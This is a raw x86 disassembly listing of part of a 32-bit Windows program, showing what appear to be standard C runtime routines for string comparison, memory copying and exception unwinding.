  426373:	pop    ecx
  426374:	mov    eax,DWORD PTR [esi+0x4]
  426377:	mov    ecx,DWORD PTR ds:0x45c934
  42637d:	cmp    eax,DWORD PTR [ecx+0x4]
  426380:	je     0x426391
  426382:	cmp    eax,DWORD PTR ds:0x45c908
  426388:	je     0x426391
  42638a:	push   eax
  42638b:	call   0x42446a
  426390:	pop    ecx
  426391:	mov    esi,DWORD PTR [esi+0x8]
  426394:	mov    eax,ds:0x45c934
  426399:	cmp    esi,DWORD PTR [eax+0x8]
  42639c:	je     0x4263ad
  42639e:	cmp    esi,DWORD PTR ds:0x45c90c
  4263a4:	je     0x4263ad
  4263a6:	push   esi
  4263a7:	call   0x42446a
  4263ac:	pop    ecx
  4263ad:	pop    esi
  4263ae:	ret    
  4263af:	push   esi
  4263b0:	mov    esi,DWORD PTR [esp+0x8]
  4263b4:	test   esi,esi
  4263b6:	je     0x426486
  4263bc:	mov    eax,DWORD PTR [esi+0xc]
  4263bf:	mov    ecx,DWORD PTR ds:0x45c934
  4263c5:	cmp    eax,DWORD PTR [ecx+0xc]
  4263c8:	je     0x4263d9
  4263ca:	cmp    eax,DWORD PTR ds:0x45c910
  4263d0:	je     0x4263d9
  4263d2:	push   eax
  4263d3:	call   0x42446a
  4263d8:	pop    ecx
  4263d9:	mov    eax,DWORD PTR [esi+0x10]
  4263dc:	mov    ecx,DWORD PTR ds:0x45c934
  4263e2:	cmp    eax,DWORD PTR [ecx+0x10]
  4263e5:	je     0x4263f6
  4263e7:	cmp    eax,DWORD PTR ds:0x45c914
  4263ed:	je     0x4263f6
  4263ef:	push   eax
  4263f0:	call   0x42446a
  4263f5:	pop    ecx
  4263f6:	mov    eax,DWORD PTR [esi+0x14]
  4263f9:	mov    ecx,DWORD PTR ds:0x45c934
  4263ff:	cmp    eax,DWORD PTR [ecx+0x14]
  426402:	je     0x426413
  426404:	cmp    eax,DWORD PTR ds:0x45c918
  42640a:	je     0x426413
  42640c:	push   eax
  42640d:	call   0x42446a
  426412:	pop    ecx
  426413:	mov    eax,DWORD PTR [esi+0x18]
  426416:	mov    ecx,DWORD PTR ds:0x45c934
  42641c:	cmp    eax,DWORD PTR [ecx+0x18]
  42641f:	je     0x426430
  426421:	cmp    eax,DWORD PTR ds:0x45c91c
  426427:	je     0x426430
  426429:	push   eax
  42642a:	call   0x42446a
  42642f:	pop    ecx
  426430:	mov    eax,DWORD PTR [esi+0x1c]
  426433:	mov    ecx,DWORD PTR ds:0x45c934
  426439:	cmp    eax,DWORD PTR [ecx+0x1c]
  42643c:	je     0x42644d
  42643e:	cmp    eax,DWORD PTR ds:0x45c920
  426444:	je     0x42644d
  426446:	push   eax
  426447:	call   0x42446a
  42644c:	pop    ecx
  42644d:	mov    eax,DWORD PTR [esi+0x20]
  426450:	mov    ecx,DWORD PTR ds:0x45c934
  426456:	cmp    eax,DWORD PTR [ecx+0x20]
  426459:	je     0x42646a
  42645b:	cmp    eax,DWORD PTR ds:0x45c924
  426461:	je     0x42646a
  426463:	push   eax
  426464:	call   0x42446a
  426469:	pop    ecx
  42646a:	mov    esi,DWORD PTR [esi+0x24]
  42646d:	mov    eax,ds:0x45c934
  426472:	cmp    esi,DWORD PTR [eax+0x24]
  426475:	je     0x426486
  426477:	cmp    esi,DWORD PTR ds:0x45c928
  42647d:	je     0x426486
  42647f:	push   esi
  426480:	call   0x42446a
  426485:	pop    ecx
  426486:	pop    esi
  426487:	ret    
  426488:	int3   
  426489:	int3   
  42648a:	int3   
  42648b:	int3   
  42648c:	int3   
  42648d:	int3   
  42648e:	int3   
  42648f:	int3   
  426490:	push   ebp
  426491:	mov    ebp,esp
  426493:	push   esi
  426494:	xor    eax,eax
  426496:	push   eax
  426497:	push   eax
  426498:	push   eax
  426499:	push   eax
  42649a:	push   eax
  42649b:	push   eax
  42649c:	push   eax
  42649d:	push   eax
  42649e:	mov    edx,DWORD PTR [ebp+0xc]
  4264a1:	lea    ecx,[ecx+0x0]
  4264a4:	mov    al,BYTE PTR [edx]
  4264a6:	or     al,al
  4264a8:	je     0x4264b3
  4264aa:	add    edx,0x1
  4264ad:	bts    DWORD PTR [esp],eax
  4264b1:	jmp    0x4264a4
  4264b3:	mov    esi,DWORD PTR [ebp+0x8]
  4264b6:	or     ecx,0xffffffff
  4264b9:	lea    ecx,[ecx+0x0]
  4264bc:	add    ecx,0x1
  4264bf:	mov    al,BYTE PTR [esi]
  4264c1:	or     al,al
  4264c3:	je     0x4264ce
  4264c5:	add    esi,0x1
  4264c8:	bt     DWORD PTR [esp],eax
  4264cc:	jae    0x4264bc
  4264ce:	mov    eax,ecx
  4264d0:	add    esp,0x20
  4264d3:	pop    esi
  4264d4:	leave  
  4264d5:	ret    
  4264d6:	int3   
  4264d7:	int3   
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	mov    edx,DWORD PTR [esp+0x4]
  4264e4:	mov    ecx,DWORD PTR [esp+0x8]
  4264e8:	test   edx,0x3
  4264ee:	jne    0x42652c
  4264f0:	mov    eax,DWORD PTR [edx]
  4264f2:	cmp    al,BYTE PTR [ecx]
  4264f4:	jne    0x426524
  4264f6:	or     al,al
  4264f8:	je     0x426520
  4264fa:	cmp    ah,BYTE PTR [ecx+0x1]
  4264fd:	jne    0x426524
  4264ff:	or     ah,ah
  426501:	je     0x426520
  426503:	shr    eax,0x10
  426506:	cmp    al,BYTE PTR [ecx+0x2]
  426509:	jne    0x426524
  42650b:	or     al,al
  42650d:	je     0x426520
  42650f:	cmp    ah,BYTE PTR [ecx+0x3]
  426512:	jne    0x426524
  426514:	add    ecx,0x4
  426517:	add    edx,0x4
  42651a:	or     ah,ah
  42651c:	jne    0x4264f0
  42651e:	mov    edi,edi
  426520:	xor    eax,eax
  426522:	ret    
  426523:	nop
  426524:	sbb    eax,eax
  426526:	shl    eax,1
  426528:	add    eax,0x1
  42652b:	ret    
  42652c:	test   edx,0x1
  426532:	je     0x42654c
  426534:	mov    al,BYTE PTR [edx]
  426536:	add    edx,0x1
  426539:	cmp    al,BYTE PTR [ecx]
  42653b:	jne    0x426524
  42653d:	add    ecx,0x1
  426540:	or     al,al
  426542:	je     0x426520
  426544:	test   edx,0x2
  42654a:	je     0x4264f0
  42654c:	mov    ax,WORD PTR [edx]
  42654f:	add    edx,0x2
  426552:	cmp    al,BYTE PTR [ecx]
  426554:	jne    0x426524
  426556:	or     al,al
  426558:	je     0x426520
  42655a:	cmp    ah,BYTE PTR [ecx+0x1]
  42655d:	jne    0x426524
  42655f:	or     ah,ah
  426561:	je     0x426520
  426563:	add    ecx,0x2
  426566:	jmp    0x4264f0
  426568:	int3   
  426569:	int3   
  42656a:	int3   
  42656b:	int3   
  42656c:	int3   
  42656d:	int3   
  42656e:	int3   
  42656f:	int3   
  426570:	mov    eax,DWORD PTR [esp+0xc]
  426574:	test   eax,eax
  426576:	je     0x4265c2
  426578:	mov    edx,DWORD PTR [esp+0x4]
  42657c:	push   esi
  42657d:	push   edi
  42657e:	mov    esi,edx
  426580:	mov    edi,DWORD PTR [esp+0x10]
  426584:	or     edx,edi
  426586:	and    edx,0x3
  426589:	je     0x4265c3
  42658b:	test   eax,0x1
  426590:	je     0x4265a3
  426592:	mov    cl,BYTE PTR [esi]
  426594:	cmp    cl,BYTE PTR [edi]
  426596:	jne    0x4265f0
  426598:	add    esi,0x1
  42659b:	add    edi,0x1
  42659e:	sub    eax,0x1
  4265a1:	je     0x4265c0
  4265a3:	mov    cl,BYTE PTR [esi]
  4265a5:	mov    dl,BYTE PTR [edi]
  4265a7:	cmp    cl,dl
  4265a9:	jne    0x4265f0
  4265ab:	mov    cl,BYTE PTR [esi+0x1]
  4265ae:	mov    dl,BYTE PTR [edi+0x1]
  4265b1:	cmp    cl,dl
  4265b3:	jne    0x4265f0
  4265b5:	add    edi,0x2
  4265b8:	add    esi,0x2
  4265bb:	sub    eax,0x2
  4265be:	jne    0x4265a3
  4265c0:	pop    edi
  4265c1:	pop    esi
  4265c2:	ret    
  4265c3:	mov    ecx,eax
  4265c5:	and    eax,0x3
  4265c8:	shr    ecx,0x2
  4265cb:	je     0x4265f8
  4265cd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4265cf:	je     0x4265f8
  4265d1:	mov    ecx,DWORD PTR [esi-0x4]
  4265d4:	mov    edx,DWORD PTR [edi-0x4]
  4265d7:	cmp    cl,dl
  4265d9:	jne    0x4265eb
  4265db:	cmp    ch,dh
  4265dd:	jne    0x4265eb
  4265df:	shr    ecx,0x10
  4265e2:	shr    edx,0x10
  4265e5:	cmp    cl,dl
  4265e7:	jne    0x4265eb
  4265e9:	cmp    ch,dh
  4265eb:	mov    eax,0x0
  4265f0:	sbb    eax,eax
  4265f2:	pop    edi
  4265f3:	sbb    eax,0xffffffff
  4265f6:	pop    esi
  4265f7:	ret    
  4265f8:	test   eax,eax
  4265fa:	je     0x4265c0
  4265fc:	mov    edx,DWORD PTR [esi]
  4265fe:	mov    ecx,DWORD PTR [edi]
  426600:	cmp    dl,cl
  426602:	jne    0x4265eb
  426604:	sub    eax,0x1
  426607:	je     0x426625
  426609:	cmp    dh,ch
  42660b:	jne    0x4265eb
  42660d:	sub    eax,0x1
  426610:	je     0x426625
  426612:	and    ecx,0xff0000
  426618:	and    edx,0xff0000
  42661e:	cmp    edx,ecx
  426620:	jne    0x4265eb
  426622:	sub    eax,0x1
  426625:	pop    edi
  426626:	pop    esi
  426627:	ret    
  426628:	int3   
  426629:	int3   
  42662a:	int3   
  42662b:	int3   
  42662c:	int3   
  42662d:	int3   
  42662e:	int3   
  42662f:	int3   
  426630:	push   ebp
  426631:	mov    ebp,esp
  426633:	push   edi
  426634:	push   esi
  426635:	push   ebx
  426636:	mov    ecx,DWORD PTR [ebp+0x10]
  426639:	jecxz  0x426662
  42663b:	mov    ebx,ecx
  42663d:	mov    edi,DWORD PTR [ebp+0x8]
  426640:	mov    esi,edi
  426642:	xor    eax,eax
  426644:	repnz scas al,BYTE PTR es:[edi]
  426646:	neg    ecx
  426648:	add    ecx,ebx
  42664a:	mov    edi,esi
  42664c:	mov    esi,DWORD PTR [ebp+0xc]
  42664f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426651:	mov    al,BYTE PTR [esi-0x1]
  426654:	xor    ecx,ecx
  426656:	cmp    al,BYTE PTR [edi-0x1]
  426659:	ja     0x426660
  42665b:	je     0x426662
  42665d:	sub    ecx,0x2
  426660:	not    ecx
  426662:	mov    eax,ecx
  426664:	pop    ebx
  426665:	pop    esi
  426666:	pop    edi
  426667:	leave  
  426668:	ret    
  426669:	int3   
  42666a:	int3   
  42666b:	int3   
  42666c:	int3   
  42666d:	int3   
  42666e:	int3   
  42666f:	int3   
  426670:	push   ebp
  426671:	mov    ebp,esp
  426673:	push   esi
  426674:	xor    eax,eax
  426676:	push   eax
  426677:	push   eax
  426678:	push   eax
  426679:	push   eax
  42667a:	push   eax
  42667b:	push   eax
  42667c:	push   eax
  42667d:	push   eax
  42667e:	mov    edx,DWORD PTR [ebp+0xc]
  426681:	lea    ecx,[ecx+0x0]
  426684:	mov    al,BYTE PTR [edx]
  426686:	or     al,al
  426688:	je     0x426693
  42668a:	add    edx,0x1
  42668d:	bts    DWORD PTR [esp],eax
  426691:	jmp    0x426684
  426693:	mov    esi,DWORD PTR [ebp+0x8]
  426696:	mov    edi,edi
  426698:	mov    al,BYTE PTR [esi]
  42669a:	or     al,al
  42669c:	je     0x4266aa
  42669e:	add    esi,0x1
  4266a1:	bt     DWORD PTR [esp],eax
  4266a5:	jae    0x426698
  4266a7:	lea    eax,[esi-0x1]
  4266aa:	add    esp,0x20
  4266ad:	pop    esi
  4266ae:	leave  
  4266af:	ret    
  4266b0:	push   ebp
  4266b1:	mov    ebp,esp
  4266b3:	push   ebx
  4266b4:	push   esi
  4266b5:	push   edi
  4266b6:	push   ebp
  4266b7:	push   0x0
  4266b9:	push   0x0
  4266bb:	push   0x4266c8
  4266c0:	push   DWORD PTR [ebp+0x8]
  4266c3:	call   0x42713e
  4266c8:	pop    ebp
  4266c9:	pop    edi
  4266ca:	pop    esi
  4266cb:	pop    ebx
  4266cc:	mov    esp,ebp
  4266ce:	pop    ebp
  4266cf:	ret    
  4266d0:	mov    ecx,DWORD PTR [esp+0x4]
  4266d4:	test   DWORD PTR [ecx+0x4],0x6
  4266db:	mov    eax,0x1
  4266e0:	je     0x4266f1
  4266e2:	mov    eax,DWORD PTR [esp+0x8]
  4266e6:	mov    edx,DWORD PTR [esp+0x10]
  4266ea:	mov    DWORD PTR [edx],eax
  4266ec:	mov    eax,0x3
  4266f1:	ret    
  4266f2:	push   ebx
  4266f3:	push   esi
  4266f4:	push   edi
  4266f5:	mov    eax,DWORD PTR [esp+0x10]
  4266f9:	push   eax
  4266fa:	push   0xfffffffe
  4266fc:	push   0x4266d0
  426701:	push   DWORD PTR fs:0x0
  426708:	mov    DWORD PTR fs:0x0,esp
  42670f:	mov    eax,DWORD PTR [esp+0x20]
  426713:	mov    ebx,DWORD PTR [eax+0x8]
  426716:	mov    esi,DWORD PTR [eax+0xc]
  426719:	cmp    esi,0xffffffff
  42671c:	je     0x42674c
  42671e:	cmp    esi,DWORD PTR [esp+0x24]
  426722:	je     0x42674c
  426724:	lea    esi,[esi+esi*2]
  426727:	mov    ecx,DWORD PTR [ebx+esi*4]
  42672a:	mov    DWORD PTR [esp+0x8],ecx
  42672e:	mov    DWORD PTR [eax+0xc],ecx
  426731:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426736:	jne    0x42674a
  426738:	push   0x101
  42673d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426741:	call   0x426786
  426746:	call   DWORD PTR [ebx+esi*4+0x8]
  42674a:	jmp    0x42670f
  42674c:	pop    DWORD PTR fs:0x0
  426753:	add    esp,0xc
  426756:	pop    edi
  426757:	pop    esi
  426758:	pop    ebx
  426759:	ret    
  42675a:	xor    eax,eax
  42675c:	mov    ecx,DWORD PTR fs:0x0
  426763:	cmp    DWORD PTR [ecx+0x4],0x4266d0
  42676a:	jne    0x42677c
  42676c:	mov    edx,DWORD PTR [ecx+0xc]
  42676f:	mov    edx,DWORD PTR [edx+0xc]
  426772:	cmp    DWORD PTR [ecx+0x8],edx
  426775:	jne    0x42677c
  426777:	mov    eax,0x1
  42677c:	ret    
  42677d:	push   ebx
  42677e:	push   ecx
  42677f:	mov    ebx,0x45c94c
  426784:	jmp    0x426790
  426786:	push   ebx
  426787:	push   ecx
  426788:	mov    ebx,0x45c94c
  42678d:	mov    ecx,DWORD PTR [ebp+0x8]
  426790:	mov    DWORD PTR [ebx+0x8],ecx
  426793:	mov    DWORD PTR [ebx+0x4],eax
  426796:	mov    DWORD PTR [ebx+0xc],ebp
  426799:	pop    ecx
  42679a:	pop    ebx
  42679b:	ret    0x4
  42679e:	int3   
  42679f:	int3   
  4267a0:	push   ebp
  4267a1:	mov    ebp,esp
  4267a3:	push   edi
  4267a4:	push   esi
  4267a5:	mov    esi,DWORD PTR [ebp+0xc]
  4267a8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267ab:	mov    edi,DWORD PTR [ebp+0x8]
  4267ae:	mov    eax,ecx
  4267b0:	mov    edx,ecx
  4267b2:	add    eax,esi
  4267b4:	cmp    edi,esi
  4267b6:	jbe    0x4267c0
  4267b8:	cmp    edi,eax
  4267ba:	jb     0x42693c
  4267c0:	test   edi,0x3
  4267c6:	jne    0x4267dc
  4267c8:	shr    ecx,0x2
  4267cb:	and    edx,0x3
  4267ce:	cmp    ecx,0x8
  4267d1:	jb     0x4267fc
  4267d3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267d5:	jmp    DWORD PTR [edx*4+0x4268ec]
  4267dc:	mov    eax,edi
  4267de:	mov    edx,0x3
  4267e3:	sub    ecx,0x4
  4267e6:	jb     0x4267f4
  4267e8:	and    eax,0x3
  4267eb:	add    ecx,eax
  4267ed:	jmp    DWORD PTR [eax*4+0x426800]
  4267f4:	jmp    DWORD PTR [ecx*4+0x4268fc]
  4267fb:	nop
  4267fc:	jmp    DWORD PTR [ecx*4+0x426880]
  426803:	nop
  426804:	adc    BYTE PTR [eax+0x42],ch
  426807:	add    BYTE PTR [eax+ebp*2],bh
  42680a:	inc    edx
  42680b:	add    BYTE PTR [eax+0x68],ah
  42680e:	inc    edx
  42680f:	add    BYTE PTR [ebx],ah
  426811:	ror    DWORD PTR [edx-0x75f877fa],1
  426817:	inc    esi
  426818:	add    DWORD PTR [eax+0x468a0147],ecx
  42681e:	add    al,cl
  426820:	jmp    0x289f027
  426825:	add    esi,0x3
  426828:	add    edi,0x3
  42682b:	cmp    ecx,0x8
  42682e:	jb     0x4267fc
  426830:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426832:	jmp    DWORD PTR [edx*4+0x4268ec]
  426839:	lea    ecx,[ecx+0x0]
  42683c:	and    edx,ecx
  42683e:	mov    al,BYTE PTR [esi]
  426840:	mov    BYTE PTR [edi],al
  426842:	mov    al,BYTE PTR [esi+0x1]
  426845:	shr    ecx,0x2
  426848:	mov    BYTE PTR [edi+0x1],al
  42684b:	add    esi,0x2
  42684e:	add    edi,0x2
  426851:	cmp    ecx,0x8
  426854:	jb     0x4267fc
  426856:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426858:	jmp    DWORD PTR [edx*4+0x4268ec]
  42685f:	nop
  426860:	and    edx,ecx
  426862:	mov    al,BYTE PTR [esi]
  426864:	mov    BYTE PTR [edi],al
  426866:	add    esi,0x1
  426869:	shr    ecx,0x2
  42686c:	add    edi,0x1
  42686f:	cmp    ecx,0x8
  426872:	jb     0x4267fc
  426874:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426876:	jmp    DWORD PTR [edx*4+0x4268ec]
  42687d:	lea    ecx,[ecx+0x0]
  426880:	jecxz  0x4268ea
  426882:	inc    edx
  426883:	add    al,dl
  426885:	push   0x68c80042
  42688a:	inc    edx
  42688b:	add    al,al
  42688d:	push   0x68b80042
  426892:	inc    edx
  426893:	add    BYTE PTR [eax-0x57ffbd98],dh
  426899:	push   0x68a00042
  42689e:	inc    edx
  42689f:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268a5:	inc    esp
  4268a6:	(bad)  
  4268a7:	in     al,0x8b
  4268a9:	inc    esp
  4268aa:	mov    gs,eax
  4268ac:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4268b0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4268b4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4268b8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4268bc:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4268c0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4268c4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4268c8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4268cc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4268d0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4268d4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4268d8:	lea    eax,[ecx*4+0x0]
  4268df:	add    esi,eax
  4268e1:	add    edi,eax
  4268e3:	jmp    DWORD PTR [edx*4+0x4268ec]
  4268ea:	mov    edi,edi
  4268ec:	cld    
  4268ed:	push   0x69040042
  4268f2:	inc    edx
  4268f3:	add    BYTE PTR [eax],dl
  4268f5:	imul   eax,DWORD PTR [edx+0x0],0x426924
  4268fc:	mov    eax,DWORD PTR [ebp+0x8]
  4268ff:	pop    esi
  426900:	pop    edi
  426901:	leave  
  426902:	ret    
  426903:	nop
  426904:	mov    al,BYTE PTR [esi]
  426906:	mov    BYTE PTR [edi],al
  426908:	mov    eax,DWORD PTR [ebp+0x8]
  42690b:	pop    esi
  42690c:	pop    edi
  42690d:	leave  
  42690e:	ret    
  42690f:	nop
  426910:	mov    al,BYTE PTR [esi]
  426912:	mov    BYTE PTR [edi],al
  426914:	mov    al,BYTE PTR [esi+0x1]
  426917:	mov    BYTE PTR [edi+0x1],al
  42691a:	mov    eax,DWORD PTR [ebp+0x8]
  42691d:	pop    esi
  42691e:	pop    edi
  42691f:	leave  
  426920:	ret    
  426921:	lea    ecx,[ecx+0x0]
  426924:	mov    al,BYTE PTR [esi]
  426926:	mov    BYTE PTR [edi],al
  426928:	mov    al,BYTE PTR [esi+0x1]
  42692b:	mov    BYTE PTR [edi+0x1],al
  42692e:	mov    al,BYTE PTR [esi+0x2]
  426931:	mov    BYTE PTR [edi+0x2],al
  426934:	mov    eax,DWORD PTR [ebp+0x8]
  426937:	pop    esi
  426938:	pop    edi
  426939:	leave  
  42693a:	ret    
  42693b:	nop
  42693c:	lea    esi,[ecx+esi*1-0x4]
  426940:	lea    edi,[ecx+edi*1-0x4]
  426944:	test   edi,0x3
  42694a:	jne    0x426970
  42694c:	shr    ecx,0x2
  42694f:	and    edx,0x3
  426952:	cmp    ecx,0x8
  426955:	jb     0x426964
  426957:	std    
  426958:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42695a:	cld    
  42695b:	jmp    DWORD PTR [edx*4+0x426a88]
  426962:	mov    edi,edi
  426964:	neg    ecx
  426966:	jmp    DWORD PTR [ecx*4+0x426a38]
  42696d:	lea    ecx,[ecx+0x0]
  426970:	mov    eax,edi
  426972:	mov    edx,0x3
  426977:	cmp    ecx,0x4
  42697a:	jb     0x426988
  42697c:	and    eax,0x3
  42697f:	sub    ecx,eax
  426981:	jmp    DWORD PTR [eax*4+0x42698c]
  426988:	jmp    DWORD PTR [ecx*4+0x426a88]
  42698f:	nop
  426990:	pushf  
  426991:	imul   eax,DWORD PTR [edx+0x0],0x4269c0
  426998:	call   0x8a42ac06
  42699d:	inc    esi
  42699e:	add    esp,DWORD PTR [ebx]
  4269a0:	ror    DWORD PTR [eax-0x117cfcb9],1
  4269a6:	add    ecx,eax
  4269a8:	jmp    0x231ecaf
  4269ad:	cmp    ecx,0x8
  4269b0:	jb     0x426964
  4269b2:	std    
  4269b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269b5:	cld    
  4269b6:	jmp    DWORD PTR [edx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    al,BYTE PTR [esi+0x3]
  4269c3:	and    edx,ecx
  4269c5:	mov    BYTE PTR [edi+0x3],al
  4269c8:	mov    al,BYTE PTR [esi+0x2]
  4269cb:	shr    ecx,0x2
  4269ce:	mov    BYTE PTR [edi+0x2],al
  4269d1:	sub    esi,0x2
  4269d4:	sub    edi,0x2
  4269d7:	cmp    ecx,0x8
  4269da:	jb     0x426964
  4269dc:	std    
  4269dd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269df:	cld    
  4269e0:	jmp    DWORD PTR [edx*4+0x426a88]
  4269e7:	nop
  4269e8:	mov    al,BYTE PTR [esi+0x3]
  4269eb:	and    edx,ecx
  4269ed:	mov    BYTE PTR [edi+0x3],al
  4269f0:	mov    al,BYTE PTR [esi+0x2]
  4269f3:	mov    BYTE PTR [edi+0x2],al
  4269f6:	mov    al,BYTE PTR [esi+0x1]
  4269f9:	shr    ecx,0x2
  4269fc:	mov    BYTE PTR [edi+0x1],al
  4269ff:	sub    esi,0x3
  426a02:	sub    edi,0x3
  426a05:	cmp    ecx,0x8
  426a08:	jb     0x426964
  426a0e:	std    
  426a0f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a11:	cld    
  426a12:	jmp    DWORD PTR [edx*4+0x426a88]
  426a19:	lea    ecx,[ecx+0x0]
  426a1c:	cmp    al,0x6a
  426a1e:	inc    edx
  426a1f:	add    BYTE PTR [edx+ebp*2+0x42],al
  426a23:	add    BYTE PTR [edx+ebp*2+0x42],cl
  426a27:	add    BYTE PTR [edx+ebp*2+0x42],dl
  426a2b:	add    BYTE PTR [edx+ebp*2+0x42],bl
  426a2f:	add    BYTE PTR [edx+ebp*2+0x42],ah
  426a33:	add    BYTE PTR [edx+ebp*2+0x42],ch
  426a37:	add    BYTE PTR [edi+0x6a],bh
  426a3a:	inc    edx
  426a3b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a41:	inc    esp
  426a42:	(bad)  
  426a43:	sbb    al,0x8b
  426a45:	inc    esp
  426a46:	mov    ds,WORD PTR [eax]
  426a48:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a4c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426a50:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426a54:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426a58:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426a5c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426a60:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426a64:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426a68:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426a6c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426a70:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426a74:	lea    eax,[ecx*4+0x0]
  426a7b:	add    esi,eax
  426a7d:	add    edi,eax
  426a7f:	jmp    DWORD PTR [edx*4+0x426a88]
  426a86:	mov    edi,edi
  426a88:	cwde   
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [eax-0x4fffbd96],ah
  426a91:	push   0x42
  426a93:	add    ah,al
  426a95:	push   0x42
  426a97:	add    BYTE PTR [ebx+0x5f5e0845],cl
  426a9d:	leave  
  426a9e:	ret    
  426a9f:	nop
  426aa0:	mov    al,BYTE PTR [esi+0x3]
  426aa3:	mov    BYTE PTR [edi+0x3],al
  426aa6:	mov    eax,DWORD PTR [ebp+0x8]
  426aa9:	pop    esi
  426aaa:	pop    edi
  426aab:	leave  
  426aac:	ret    
  426aad:	lea    ecx,[ecx+0x0]
  426ab0:	mov    al,BYTE PTR [esi+0x3]
  426ab3:	mov    BYTE PTR [edi+0x3],al
  426ab6:	mov    al,BYTE PTR [esi+0x2]
  426ab9:	mov    BYTE PTR [edi+0x2],al
  426abc:	mov    eax,DWORD PTR [ebp+0x8]
  426abf:	pop    esi
  426ac0:	pop    edi
  426ac1:	leave  
  426ac2:	ret    
  426ac3:	nop
  426ac4:	mov    al,BYTE PTR [esi+0x3]
  426ac7:	mov    BYTE PTR [edi+0x3],al
  426aca:	mov    al,BYTE PTR [esi+0x2]
  426acd:	mov    BYTE PTR [edi+0x2],al
  426ad0:	mov    al,BYTE PTR [esi+0x1]
  426ad3:	mov    BYTE PTR [edi+0x1],al
  426ad6:	mov    eax,DWORD PTR [ebp+0x8]
  426ad9:	pop    esi
  426ada:	pop    edi
  426adb:	leave  
  426adc:	ret    
  426add:	push   ebp
  426ade:	mov    ebp,esp
  426ae0:	sub    esp,0xc
  426ae3:	mov    eax,ds:0x45c430
  426ae8:	xor    eax,DWORD PTR [ebp+0x4]
  426aeb:	and    BYTE PTR [ebp-0x6],0x0
  426aef:	push   0x6
  426af1:	mov    DWORD PTR [ebp-0x4],eax
  426af4:	lea    eax,[ebp-0xc]
  426af7:	push   eax
  426af8:	push   0x1004
  426afd:	push   DWORD PTR [ebp+0x8]
  426b00:	call   DWORD PTR ds:0x4280dc
  426b06:	test   eax,eax
  426b08:	jne    0x426b0f
  426b0a:	or     eax,0xffffffff
  426b0d:	jmp    0x426b19
  426b0f:	lea    eax,[ebp-0xc]
  426b12:	push   eax
  426b13:	call   0x426e1e
  426b18:	pop    ecx
  426b19:	mov    ecx,DWORD PTR [ebp-0x4]
  426b1c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b1f:	call   0x423f2c
  426b24:	leave  
  426b25:	ret    
  426b26:	push   0x38
  426b28:	push   0x428ea8
  426b2d:	call   0x423858
  426b32:	mov    eax,ds:0x45c430
  426b37:	xor    eax,DWORD PTR [ebp+0x4]
  426b3a:	mov    DWORD PTR [ebp-0x1c],eax
  426b3d:	xor    edi,edi
  426b3f:	mov    DWORD PTR [ebp-0x20],edi
  426b42:	mov    DWORD PTR [ebp-0x24],edi
  426b45:	mov    eax,DWORD PTR [ebp+0x14]
  426b48:	mov    ebx,DWORD PTR [eax]
  426b4a:	mov    DWORD PTR [ebp-0x28],ebx
  426b4d:	mov    DWORD PTR [ebp-0x2c],edi
  426b50:	mov    eax,DWORD PTR [ebp+0x8]
  426b53:	cmp    eax,DWORD PTR [ebp+0xc]
  426b56:	je     0x426ccf
  426b5c:	lea    ecx,[ebp-0x40]
  426b5f:	push   ecx
  426b60:	push   eax
  426b61:	mov    esi,DWORD PTR ds:0x4280a0
  426b67:	call   esi
  426b69:	test   eax,eax
  426b6b:	je     0x426b8d
  426b6d:	cmp    DWORD PTR [ebp-0x40],0x1
  426b71:	jne    0x426b8d
  426b73:	lea    eax,[ebp-0x40]
  426b76:	push   eax
  426b77:	push   DWORD PTR [ebp+0xc]
  426b7a:	call   esi
  426b7c:	test   eax,eax
  426b7e:	je     0x426b8d
  426b80:	cmp    DWORD PTR [ebp-0x40],0x1
  426b84:	jne    0x426b8d
  426b86:	mov    DWORD PTR [ebp-0x2c],0x1
  426b8d:	cmp    DWORD PTR [ebp-0x2c],edi
  426b90:	je     0x426bac
  426b92:	cmp    ebx,0xffffffff
  426b95:	je     0x426b9b
  426b97:	mov    esi,ebx
  426b99:	jmp    0x426ba7
  426b9b:	push   DWORD PTR [ebp+0x10]
  426b9e:	call   0x423e70
  426ba3:	pop    ecx
  426ba4:	mov    esi,eax
  426ba6:	inc    esi
